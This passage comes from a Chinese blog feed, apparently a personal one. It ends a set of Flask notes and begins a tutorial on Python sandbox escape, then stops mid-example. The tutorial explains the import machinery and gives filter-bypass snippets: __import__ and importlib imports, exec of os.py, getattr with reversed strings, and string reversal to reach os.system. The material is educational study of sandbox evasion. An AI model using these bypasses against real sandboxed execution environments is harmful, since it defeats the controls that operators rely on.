)</p><p>response.delete_cookie()–删除cookie</p><pre class="language-none"><code class="language-none">from flask import sessionsession['test']='test'</code></pre><h2 id="请求钩子与上下文"><a href="#请求钩子与上下文" class="headerlink" title="请求钩子与上下文"></a>请求钩子与上下文</h2><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>abort(code)</p><p>http异常主动抛出，抛出一个状态码code</p><h5 id="捕获错误"><a href="#捕获错误" class="headerlink" title="捕获错误"></a>捕获错误</h5><p>errorhandler装饰器</p><p>注册一个错误处理程序，当程序抛出异常时，就会执行装饰器的方法</p><pre class="language-none"><code class="language-none">@app.errorhandler(500(状态码或异常的类型))def server_error(e):...</code></pre><h3 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h3><p>请求钩子是一种在Flask框架中实现请求前后执行一些操作的方法，比如打印日志、验证身份、处理异常等。请求钩子是通过<strong>装饰器</strong>的形式实现，Flask支持如下四种请求钩子：</p><ul><li><code>before_first_request</code>：在处理第一个请求之前执行，可以用于初始化项目的一些配置或资源。</li><li><code>before_request</code>：在每次请求之前执行，可以用于判断权限、转换路由参数或预处理客户端请求的数据。</li><li><code>after_request</code>：在每次请求（视图函数处理）之后执行，前提是视图函数没有出现异常，可以用于修改响应数据、记录操作历史、清理收尾工作等。</li><li><code>teardown_request</code>：在每次请求之后执行，无论视图函数是否出现异常，可以用于记录异常信息、释放资源等。</li></ul><p>示例</p><pre class="language-none"><code class="language-none">@app.before_first_requestdef init_db():    print("初始化数据库连接")</code></pre><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><p>Flask中的上下文是指在处理请求时，Flask会创建一些对象，如request, session, current_app, g等，这些对象保存了请求相关的信息或程序的状态。上下文可以让视图函数直接访问这些对象，而不需要通过参数传递。</p><p>Flask中有两种上下文：请求上下文和程序上下文。</p><ul><li>请求上下文包括request和session，它们是从_request_ctx_stack这个LocalStack对象中获取的。</li><li>程序上下文包括current_app和g，它们是从_app_ctx_stack这个LocalStack对象中获取的。</li></ul><h5 id="请求上下文"><a href="#请求上下文" class="headerlink" title="请求上下文"></a>请求上下文</h5><p>–解决多线程问题</p><p>request、session</p><h5 id="程序上下文"><a href="#程序上下文" class="headerlink" title="程序上下文"></a>程序上下文</h5><p>不同文件下调用对象</p><p><strong>current_app</strong></p><pre class="language-none"><code class="language-none">from flask import current_app引用current_app相当于主程序中的app对象current_app.config.get('Itcast')</code></pre><p><strong>g对象</strong></p><p>g作为flask程序全局的一个临时变量，便于函数之间的参数传递</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>模板中的变量</p><p><code>{{ var }}</code>,视图传递模板的数据，变量不存在，默认忽略</p><p>模板中的标签</p><p><code>{% tag %}</code></p><h3 id="主要语法标签："><a href="#主要语法标签：" class="headerlink" title="主要语法标签："></a>主要语法标签：</h3><p>变量标记 - <code>{{ }}</code></p><p>语句执行 - <code>{% %}</code></p><p>注释语句 - ````</p><p>变量输出：</p><p>变量输出以<code>{{ }}</code>包裹</p><p>变量 - <code>{{变量名}}</code>，比如<code>{{myname}}</code></p><p>对象 - <code>{{obj.属性}}</code>、字典 - <code>{{dict['key']}}</code>、列表 - <code>{{lists[i]}}</code>、函数 - <code>{{func()}}</code></p><p><strong>条件语句</strong>：</p><p>根据条件选择显示不同的html部分</p><pre class="language-none"><code class="language-none">{% if condition %}     html{% elif condition %}    html{% else %}    html{% endif %}</code></pre><p>for <strong>循环语句</strong>：</p><pre class="language-none"><code class="language-none">{% for item in items %}   html{{item}} html{% endfor %}</code></pre><p>设置变量</p><pre class="language-none"><code class="language-none">{% set a='666' %}{{ a }}</code></pre><h5 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h5><p>将网页结构提取出来，新建一个base.html</p><p>继承语法：</p><p><code>{% extend "base.html" %}</code></p><p>其中base.html为父模板，所有的字模板脑结构都继承自base</p><p>模板全局变量</p><p>上下文处理函数：</p><pre class="language-none"><code class="language-none">@app.context_processordef account():username = "luxp"return {'username':'luxp'}</code></pre><p>每个视图函数执行的时候，会自动执行该函数，接受该变量传给模板渲染函数</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> web框架 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探python沙箱逃逸</title>
      <link href="/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="初探python沙箱逃逸"><a href="#初探python沙箱逃逸" class="headerlink" title="初探python沙箱逃逸"></a>初探python沙箱逃逸</h1><p>为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os</p><p>沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h1><h3 id="命令执行函数与模块"><a href="#命令执行函数与模块" class="headerlink" title="命令执行函数与模块"></a>命令执行函数与模块</h3><p>在 Python 中执行系统命令的方式有：</p><ul><li>os：<code>system</code>,<code>popen</code></li><li>commands：(仅限<code>2.x</code>)<code>getstatusoutput</code>,<code>getoutput</code></li><li>subprocess: <code>getstatusoutput</code>,<code>getoutput</code></li><li>timeit：<code>timeit.sys</code>、<code>timeit.timeit("__import__('os').system('whoami')", number=1)</code></li><li>platform：<code>platform.os</code>、<code>platform.sys</code>、<code>platform.popen('whoami', mode='r', bufsize=-1).read()</code></li><li>pty：<code>pty.spawn('ls')</code>、<code>pty.os</code></li><li>bdb：<code>bdb.os</code>、<code>cgi.sys</code></li><li>cgi：<code>cgi.os</code>、<code>cgi.sys</code></li></ul><pre class="language-none"><code class="language-none">print(os.system('whoami'))print(os.popen('whoami').read()) print(os.popen2('whoami').read()) # 2.xprint(os.popen3('whoami').read()) # 2.xprint(os.popen4('whoami').read()) # 2.x...</code></pre><h3 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h3><p>命名空间定义了在某个作用域内变量名和绑定值之间的对应关系，命名空间是键值对的集合，变量名与值是一一对应关系。作用域定义了命名空间中的变量能够在多大范围内起作用。命名空间在python解释器中是以字典的形式存在的，是以一种可以看得见摸得着的实体存在的。作用域是python解释器定义的一种规则，该规则确定了运行时变量查找的顺序，是一种形而上的虚的规定。</p><p><strong>命令空间</strong></p><ul><li>命名空间提供了一个在大型项目下避免名字冲突的方法</li><li>Python 中各个命名空间都是独立的，他们之间无任何关系</li><li>一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</li></ul><p>命名空间的种类分为 3 类，命名空间的种类也体现了命名空间的生命周期。三个种类及生命周期描述如下：</p><p>1）内置名称（built-in names）</p><p>Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。</p><p>生命周期：</p><p>对于Python built-in names组成的命名空间，它在Python解释器启动的时候被创建，在解释器退出的时候才被删除；</p><p>2）全局名称（global names）</p><p>模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。</p><p>生命周期：</p><p>对于一个Python模块的global namespace，它在这个module被import的时候创建，在解释器退出的时候退出；</p><p>3）局部名称（local names）</p><p>函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p><p>生命周期：</p><p>对于一个函数的local namespace，它在函数每次被调用的时候创建，函数返回的时候被删除。</p><p>注意： 命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束。 因此，我们无法从外部命名空间访问内部命名空间的对象。例如：</p><pre class="language-none"><code class="language-none"># var1 是全局名称var1 = 5def some_func():       # var2 是局部名称    var2 = 6    def some_inner_func():           # var3 是内嵌的局部名称        var3 = 7</code></pre><p>局部的命名空间 -&gt; 全局命名空间 -&gt; 内置命名空间</p><p><strong>作用域</strong></p><p>作用域就是一个 Python 程序可以直接访问命名空间的正文区域。</p><ul><li>Python 程序中，直接访问一个变量，会从内到外依次访问所有的作用域直到找到，否则会报未定义的错误。</li><li>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</li><li>Python 中， 变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称</li></ul><p>作用域分为4类，分别如下：</p><ul><li>L（Local）：最内层，包含局部变量，比如一个函数/方法内部。</li><li>E（Enclosing）：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal。</li><li>G（Global）：当前脚本的最外层，比如当前模块的全局变量。</li><li>B（Built-in）： 包含了内建的变量/关键字等，最后被搜索。</li></ul><p>作用域规则顺序为： L-&gt;E-&gt;G-&gt;B 如果变量在局部内找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再找不到就去内置中找，</p><h2 id="Python-import机制"><a href="#Python-import机制" class="headerlink" title="Python import机制"></a>Python import机制</h2><p>具体细节参考官方文档</p><h3 id="模块-module-与-包-package"><a href="#模块-module-与-包-package" class="headerlink" title="模块 module 与 包 package"></a><strong>模块 module 与 包 package</strong></h3><p>模块–</p><p>一个 <em>.py</em> 后缀文件即是 Python 的一个模块。在模块的内部，可以通过全局变量 <code>__name__</code> 来获得模块名。模块可以包含可执行的语句，这些语句会在模块 <strong>初始化</strong> 的时候执行 —— 当所在模块被 <code>import</code> 导入时它们有且只会执行一次。</p><p>包–</p><p>目前的 Python 实际上是有两种包的存在：<strong>正规包</strong>（<em>regular Package</em>） 以及 <strong>命名空间包</strong>（<em>Namespace package</em>）。</p><blockquote><p>要注意的是，Python 的 package 实际上都是特殊的 module ：可以通过导入 package 之后查看 <code>globals()</code> 可知；实际上，任何带有 <strong>path</strong> 属性的对象都会被 Python 视作 package 。</p></blockquote><ul><li>正规包： 在 Python 3.2 之前就已经存在了的，通常是以包含一个 <code>__init__.py</code> 文件的目录形式展现。当 package 被导入时，这个 <code>__init__.py</code> 文件会被 <em>隐式</em> 地执行。</li><li>命名空间包： 根据 PEP420 的定义，命名空间包是由多个 <em>portion</em> 组成的 —— <em>portion</em> 类似于父包下的子包，但它们物理位置上不一定相邻，而且它们可能表现为 .zip 中的文件、网络上的文件等等。命名空间包不需要 <code>__init__.py</code> 文件，只要它本身或者子包（也就是 <em>portion</em>）被导入时，Python 就会给顶级的部分创建为命名空间包 —— 因此，命名空间包不一定直接对应到文件系统中的对象，它可以是一个 <em>虚拟</em> 的 module 。</li></ul><h2 id="import导包"><a href="#import导包" class="headerlink" title="import导包"></a>import导包</h2><p>import就是将python文件转化为一个python对象–module 的一个操作</p><p>模块中的 Python 代码可以通过 import（导入）操作访问另一个模块内的代码。<code>import</code> 语句时调起导入机制的常用方式，但不是唯一方式。<code>importlib.import_module()</code> 以及内置的 <code>__import__()</code> 函数都可以调起导入机制。</p><p><code>import</code> 语句实际上结合了两个操作：</p><ol><li>搜索操作：根据指定的命名查找模块</li><li>绑定操作：将搜索的结果绑定到当前作用域对应的命名上</li></ol><p><code>import</code> 的 search 操作实际上是带参调用 <code>__import__()</code> 函数，而函数的返回值会用在 <code>import</code> 语句的绑定操作上。</p><p>直接调用 <code>__import__()</code> 只会执行模块查找，以及如果找到的话就创建模块。这会有一定的副作用，比如导入父包和更新各式各样的缓存（包括 <code>sys.modules</code>），而且绑定操作只有 <code>import</code> 语句才会做得到。</p><blockquote><p>其他调起导入机制的行为（比如 <code>importlib.import_module()</code>）有可能会绕过 <code>__import__()</code> 并使用自定义的方法来实现导入。</p></blockquote><p>当一个模块被首次导入时，Python 会搜索该模块，如果找到就创建一个 <code>module</code> 对象并初始化；如果未找到则抛出 <code>ModuleNotFoundError</code> 异常。至于如何找到这些模块，Python 定义了多种的 <strong>搜索策略</strong> （search strategy），而这些策略可以通过 <code>importlib</code> 等提供的各类 hook 来修改和扩展。</p><blockquote><p>根据 Python 3.3 的 changlog 可知目前导入系统已完全实现了 PEP302 的提案，所有的导入机制都会通过 <code>sys.meta_path</code> 暴露出来，不会再有任何隐式的导入机制。</p></blockquote><h2 id="import搜索机制"><a href="#import搜索机制" class="headerlink" title="import搜索机制"></a>import搜索机制</h2><h4 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a><strong>模块搜索路径</strong></h4><p>当我们要导入一个模块（比如 <code>foo</code> ）时，解释器首先会根据命名查找内置模块，如果没有找到，它就会去查找 <code>sys.path</code> 列表中的目录，看目录中是否有 <em>foo.py</em> 。<code>sys.path</code> 的初始值来自于：</p><ul><li>运行脚本所在的目录（如果打开的是交互式解释器则是当前目录）</li><li><code>PYTHONPATH</code> 环境变量（类似于 <code>PATH</code> 变量，也是一组目录名组成）</li><li>Python 安装时的默认设置</li></ul><p>为了开始搜索，Python 需要被导入模块（或者包）的完全限定名(<em>fully qualified name</em>)。这个名称可能作为 <code>import</code> 语句的参数得到，或者是从函数 <code>importlib.import_module()</code> 或 <code>__import__()</code> 的传参得到。</p><h4 id="1-缓存-cache"><a href="#1-缓存-cache" class="headerlink" title="1.缓存 cache"></a>1.<strong>缓存 cache</strong></h4><p>在导入搜索开始前，会先检查 <code>sys.modules</code> </p><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules["os"]</code>），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p><p>它是导入系统的缓存，如果之前已经导入过 <code>foo.bar.baz</code>，则将会包含 <code>foo</code>，<code>foo.bar</code> 以及 <code>foo.bar.baz</code> 键，其对应的值为各自的 <code>module</code> 对象。</p><p>导入期间，如果在 <code>sys.modules</code> 找到对应的模块名的键，则取出其值，导入完成（如果值为 <code>None</code> 则抛出 <code>ModuleNotFoundError</code> 异常）；否则就进行搜索操作。</p><blockquote><p><code>sys.modules</code> 是可修改的，强制赋值 <code>None</code> 会导致下一次导入该模块抛出 <code>MoudleNotFoundError</code> 异常；如果删掉该键则会让下次导入触发搜索操作。</p></blockquote><p>注意，如果要更新缓存，使用 <strong>删除</strong> <strong>sys.modules</strong> <strong>的键</strong> 这种做法会有副作用，因为这样回导致前后导入的同名模块的 <code>module</code> 对象不是同一个。最好的做法应该是使用 <code>importlib.reload()</code> 函数。</p><h4 id="2-查找器-finder-和加载器-loader"><a href="#2-查找器-finder-和加载器-loader" class="headerlink" title="2.查找器 finder 和加载器 loader"></a>2.<strong>查找器</strong> <strong>finder</strong> <strong>和加载器</strong> <strong>loader</strong></h4><p>如果在缓存中找不到模块对象，则 Python 会根据 import 协议去查找和加载该模块进来。这个协议在 PEP320 中被提出，有两个主要的组成概念：finder 和 loader 。finder 的任务是确定能否根据已知的策略找到该名称的模块。同时实现了 finder 和 loader 接口的对象叫做 <strong>importer</strong> —— 它会在找到能够被加载的所需模块时返回自身。</p><p>Python 自带了一些默认的 finder 和 importer 。其中第一个知道 <strong>如何定位内置模块</strong>，第二个知道 <strong>如何定位 frozen 模块</strong>，第三个默认的 finder 会在 <strong>import path</strong> 中查找模块（即 <code>path based finder</code>）。</p><blockquote><p>注意在 Python 3.4 之前 finder 会直接返回 loader 而不是 module spec，后者实际上已经包含了 loader 。</p></blockquote><p>我们可以打印来看一下这三个 Importer 和 Finder ：</p><pre class="language-none"><code class="language-none">import sysimport pprintpprint.pprint(sys.meta_path)# [&lt;class '_frozen_importlib.BuiltinImporter'&gt;,#  &lt;class '_frozen_importlib.FrozenImporter'&gt;,#  &lt;class '_frozen_importlib_external.PathFinder'&gt;]</code></pre><p>finder 并不会真正加载模块。如果他能找到对应命名的模块，会返回一个 <em>module spec</em>，它实际上是 module 导入所需信息的封装，供后续导入机制使用来加载模块。</p><h4 id="import-hook"><a href="#import-hook" class="headerlink" title="import hook"></a><strong>import hook</strong></h4><p>import hook 是用来扩展 import 机制的，它有两种类型</p><ul><li>meta hook</li><li>import path hook</li></ul><p>meta hook 会在导入的最开始被调用（在查找缓存 <code>sys.modules</code> 之后），你可以在这里重载对 <code>sys.path</code>、frozen module甚至内置 module 的处理。只需要往 <code>sys.meta_path</code> 添加一个新的 finder 即可注册 meta_hook 。</p><p>import path hook 会在 <code>sys.path</code> （或 <code>package.__path__</code>）处理时被调用，它们会负责处理 <code>sys.path</code> 中的条目。只需要往 <code>sys.path_hooks</code> 添加一个新的可调用对象即可注册 import path hook 。</p><h4 id="元路径-meta-path"><a href="#元路径-meta-path" class="headerlink" title="元路径 meta_path"></a><strong>元路径 meta_path</strong></h4><p>当无法从 <code>sys.modules</code> 中找到模块时，Python 会继续搜索 <code>sys.meta_path</code> 列表，列表中的 finder 会被<strong>依次</strong>用来查询是否知道如何处理这个命名的模块。</p><p>所有的 <em>meta path</em> <em>finder</em> 都必须实现 <code>find_spec</code> 方法（参考 <em>importlib.abc.MetaPathFinder.find_spec</em>），如果无法处理就返回 <code>None</code>；否则返回一个 <code>spec</code> 对象（即 <code>importlib.machinery.ModuleSpec</code> 的实例）。如果全部的 finder 都没有返回，将抛出 <code>ModuleNotFoundError</code> 异常并放弃导入。</p><p><strong>find_spec(fullname, path, target=None)</strong></p><p>以 foo.bar.baz 模块为例对 <code>find_spec</code> 进行说明</p><p>参数说明示例fullname被导入模块的完全限定名foo.bar.bazpath供搜索使用的路径列表，对于最顶级模块，这个值为 None；对于子包，这个值为父包的 <strong>path</strong> 属性值foo.bar.__path__target用作稍后加载目标的现有模块对象，这个值仅会在重载模块时传入None</p><p>对于单个导入请求可能会多次遍历 meta_path，加入示例的模块都尚未被缓存，则会在每个 finder （以 <code>mpf</code> 命名）上依次调用</p><ul><li>mpf.find_spec(“foo”, None, None)</li><li>mpf.find_spec(“foo.bar”, foo.<strong>path</strong>, None)</li><li>mpf.find_spec(“foo.bar.baz”, foo.bar.<strong>path</strong>, None)</li></ul><blockquote><p>Python 3.4 之后 finder 的 <code>find_module()</code> 已被 <code>find_spec()</code> 所替代并弃用。</p></blockquote><h2 id="import加载机制"><a href="#import加载机制" class="headerlink" title="import加载机制"></a>import加载机制</h2><p>源代码</p><pre class="language-none"><code class="language-none">module = Noneif spec.loader is not None and hasattr(spec.loader, 'create_module'):    # It is assumed 'exec_module' will also be defined on the loader.    # 假定 loader 中已经定义了 `exec_module` 模块    module = spec.loader.create_module(spec)if module is None:    module = ModuleType(spec.name)# The import-related module attributes get set here:# 和模块导入相关联的属性在这个初始化方法中被设置_init_module_attrs(spec, module)if spec.loader is None:    if spec.submodule_search_locations is not None:        # namespace package        # 倘若这个模块是命名空间包        sys.modules[spec.name] = module    else:        # unsupported        # 不支持命名空间包        raise ImportErrorelif not hasattr(spec.loader, 'exec_module'):    module = spec.loader.load_module(spec.name)    # Set __loader__ and __package__ if missing.    # 如果缺失 `__loader__` 和 `__package__` 属性则要补充else:    sys.modules[spec.name] = module    try:        spec.loader.exec_module(module)    except BaseException:        try:            del sys.modules[spec.name]        except KeyError:            pass        raisereturn sys.modules[spec.name]</code></pre><p>以下是一些细节：</p><ul><li>在 loader 执行 <code>exec_module</code> 之前，需要将模块缓存在 <code>sys.modules</code> ：因为模块可能会导入自身，这样做可以防止无限递归（最坏情况）或多次加载（最好情况）。</li><li>如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除。任何已经存在的模块或者依赖但成功加载的模块都会保留 —— 这和重载不一样，后者即使加载失败也会保留失败的模块在 <code>sys.modules</code> 中。</li><li>模块的执行是加载的关键步骤，它负责填充模块的命名空间。模块执行将会全权委托给 loader ，由 loader 决定如何填充和填充什么。</li><li>创建出来并传递给 <code>exec_module</code> 执行的 module 对象可能和最后被 import 的 module 对象不一样。</li></ul><h3 id="loader-对象"><a href="#loader-对象" class="headerlink" title="loader 对象"></a><strong>loader</strong> <strong>对象</strong></h3><p>loader 是 <code>importlib.abc.Loader</code> 的实例，负责提供最关键的加载功能：模块执行。它的 <code>exec_module()</code> 方法接受唯一一个参数 —— module 对象，它所有的返回值都会被忽略。</p><p>loader 必须满足以下条件：</p><ul><li>如果这个 module 是一个 Python module（和内置模块以及动态加载的扩展相区分），则 loader 应该在模块的全局命名空间（<code>module.__dict__</code>）中执行模块代码。</li><li>如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常。</li></ul><p>Python 3.4 的两个变化：</p><ol><li>loader 提供 create_module() 来创建 module 对象（接受一个 module spec object 并返回 module object）。如果返回 None ，则由导入机制自行创建模块。因为 module 对象在模块执行前必须存在 sys.modules 中。</li><li>load_module() 方法被 exec_module() 方法替代，为了向前兼容，如果存在 load_module() 且未实现 exec_module， 导入机制才会使用 load_module() 方法。</li></ol><h3 id="module-spec-对象"><a href="#module-spec-对象" class="headerlink" title="module spec 对象"></a><strong>module</strong> <strong>spec</strong> <strong>对象</strong></h3><p>module spec 主要有两个作用：</p><ol><li>传递 —— 可以在导入系统的不同组件，如 finder 和 loader 之间传递状态信息</li><li>模板(boilerplate)构建 —— 导入机制可以根据 module spec 执行模板加载操作，没有 module spec 则 loader 需要负责完成这个工作。</li></ol><p>module spec 通过 module 对象的 <strong>spec</strong> 属性得以公开，可以查看 <em>ModuleSpec</em> 获取更多信息。</p><pre class="language-none"><code class="language-none"> import requestsrequests.__spec__ModuleSpec(name='requests', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x000002EE4EBBF7B8&gt;, origin='C:\\Python37\\lib\\site-packages\\requests\\__init__.py', submodule_search_locations=['C:\\Python37\\lib\\site-packages\\requests'])</code></pre><p>在 <code>_init_module_attrs</code> 步骤中，导入机制会根据 module spec 填充 module 对象（这个过程发生在 loader 执行模块之前）</p><table><thead><tr><th><strong>属性</strong></th><th>说明</th></tr></thead><tbody><tr><td><strong>name</strong></td><td>模块的完全限定名</td></tr><tr><td><strong>loader</strong></td><td>模块加载时使用的 loader 对象，主要是用于内省</td></tr><tr><td><strong>package</strong></td><td>取代 <code>__name__</code> 用于处理相对导入，必须设置！当导入包时，这个值和 <code>__name__</code> 相同；当导入子包时，则为其父包名；为顶级模块时，应该为空字符串</td></tr><tr><td><strong>spec</strong></td><td>导入时要使用的 module spec 对象</td></tr><tr><td><strong>path</strong></td><td>如果模块为包，则必须设置！这个值为可迭代对象，如果没有进一步用途，可以为空，否则迭代结果应该为字符串</td></tr><tr><td><strong>file</strong></td><td>可选值，只有内置模块可以不设置 <code>__file__</code> 属性</td></tr><tr><td><strong>cached</strong></td><td>为编译后字节码文件所在路径，它和 <code>__file__</code> 的存在互不影响</td></tr></tbody></table><blockquote><p>在命名空间包出来之前，如果想实现命名空间包功能，一般是在包的 <code>__init__.py</code> 中修改其 <code>__path__</code> 属性。随着 PEP420 的引入，命名空间包已经可以不需要 <code>__init__.py</code> 的这种操作了。</p></blockquote><h3 id="path-based-finder-基于元路径查找器"><a href="#path-based-finder-基于元路径查找器" class="headerlink" title="path-based-finder 基于元路径查找器"></a><strong>path-based-finder 基于元路径查找器</strong></h3><p>上文已经提到过，Python 默认自带了几个 meta path 的 finder ，其中之一就是 <strong>PathBasedFinder</strong> ，它负责搜索 <em>import path</em> 上的路径。</p><p>这个 finder 实际上并不知道如何进行 import ，它的工作只是遍历 <em>import path</em> 上的每一个条目，将它们关联到某个知道如何处理特定类型路径的 <strong>path entry finder</strong>（路径条目查找器）。</p><blockquote><p>根据术语表，<strong>path entry</strong> <strong>finder</strong> 是由 <code>sys.path_hook</code> 列表中的可调用对象返回的（前提是它知道如何根据特定路径条目找到模块）。</p></blockquote><p>可以将 <em>PathEntryFinder</em> 看作 <em>PathBasedFinder</em> 的具体实现。实际上，如果从 <code>sys.meta_path</code> 中移除了 <em>PathBasedFinder</em> ，则不会有任何 <em>PathEntryFinder</em> 被调用。</p><h3 id="path-entry-finder-路径条目查找器"><a href="#path-entry-finder-路径条目查找器" class="headerlink" title="path entry finder 路径条目查找器"></a><strong>path entry</strong> <strong>finder</strong> <strong>路径条目查找器</strong></h3><p><em>PathBasedFinder</em> 会使用到三个变量，它们会提供给自定义导入机制的额外途径，包括：</p><ul><li><code>sys.path</code></li><li><code>sys.path_hooks</code></li><li><code>sys.path_importer_cache</code></li></ul><blockquote><p>包的 <strong>path</strong> 属性也会被使用。</p></blockquote><p><code>sys.path</code> 是一个字符串列表，提供了模块和包的搜索位置。它的条目可以来自于文件系统的目录、zip 文件或者其他潜在可以找到模块的“位置”（参考 <code>site</code> 模块）。</p><p>由于 <em>PathBasedFinder</em> 是一个 <em>meta path</em> <em>finder</em> ，所以必须实现了 <code>find_spec()</code> 方法。导入机制会通过调用这个方法来搜索 <em>import path</em> （通过传入 <code>path</code> 参数 —— 它是一个可遍历的字符串列表）。</p><p>在 <code>find_spec()</code> 内部，会迭代 path 的每个条目，并且每次都查找与条目相对应的 <em>PathEntryFinder</em>。但由于这个操作会很耗资源，因此 <em>PathBasedFinder</em> 会维持一个缓存 —— <code>sys.path_importer_caceh</code> 来存放路径条目到 finder 之间的映射（虽然是这样子命名，但它存放的确实是 finder 对象而不是 importer 对象）。那么只要条目找到过一次 finder 就不会重新再匹配（你可以手动移除缓存条目来达到再次强制匹配的目的）。</p><p>如果缓存中没有对应路径条目的键，则会迭代 <code>sys.path_hooks</code> 中的每个 可调用对象。这些可调用对象都接受一个 <code>path</code> 参数，并返回一个 <em>PathEntryFinder</em> 或者抛出 <code>ImportError</code> 异常。</p><p>如果遍历完整个 <code>sys.path_hooks</code> 的可调用对象都没有返回 <em>PathEntryFinder</em>，则 <code>find_spec()</code> 方法会在 <code>sys.path_importer_cache</code> 中存入 <code>None</code> 并返回 <code>None</code> ，表示 <em>PathBasedFinder</em> 无法找到该模块。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python启动时默认初始化能得到的:</p><ul><li>sys.modules : 一个存放了曾经导入的模块(也包括一些内置模块)的字典(缓存)</li><li>sys.path ：初始化的路径(包括项目路径，系统PATH路径，Python安装的路径)</li></ul><p>当需要import一个模块时，主要分为查找和加载两步</p><ul><li>查找：首先在sys.modules中查找，若未查找到，则触发相应查找机制，通过内置的finder查找器在已经初始化好（sys.path;meta_path）的路径下寻找模块,若找到则会返回一个 <code>spec</code> 对象，否则抛出不能找到模块的异常</li><li>加载：首先会将模块信息缓存在sys.modules中，如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除，然后创建module对象，创建相应的命名空间，并对该module对象进行初始化–写入一些模块内置属性（__name__、__spec__等等）然后传递module对象给加载核心loader,在模块的全局命名空间（module.__dict__）中执行模块代码(创建模块代码中相应对象和执行相应代码)。如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常</li></ul><p>加载成功后返回对应module对象赋给import 后面的模块名(当然也可以通过as赋予其他名字)，并写入缓存</p><p>参考文章：<a href="http://sinhub.cn/2019/05/python-import-machinery-part-one/">http://sinhub.cn/2019/05/python-import-machinery-part-one/</a></p><h1 id="命令执行沙箱逃逸"><a href="#命令执行沙箱逃逸" class="headerlink" title="命令执行沙箱逃逸"></a>命令执行沙箱逃逸</h1><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>直接禁用 <code>import os</code> 肯定是不行的</p><pre class="language-none"><code class="language-none">import  osimport   osimport    os...</code></pre><p>如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p><p>import本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替（python2）：</p><pre class="language-none"><code class="language-none">execfile('/usr/lib/python2.7/os.py')system('ls')</code></pre><p>也可以这样，比较通用</p><pre class="language-none"><code class="language-none">with open('/usr/lib/python3.6/os.py','r') as f:    exec(f.read())system('ls')</code></pre><p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下</p><pre class="language-none"><code class="language-none">import sysprint(sys.path)</code></pre><p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p><p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p><p>所以删了 <code>sys.modules['os']</code> 只会让 Python 重新加载一次 os。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>可以通过 <code>getattr</code> 拿到对象的方法、属性</p><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code></p><pre class="language-none"><code class="language-none">import osgetattr(os, 'metsys'[::-1])('whoami')</code></pre><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')macr0phag30</code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os</p><p>以禁掉os字符串为例：</p><ol><li>字符串数组逆序</li></ol><pre class="language-none"><code class="language-none">__import__('so'[::-1]).system('ls')</code></pre><ol><li>字符串拼接</li></ol><pre class="language-none"><code class="language-none">b = 'o'a = 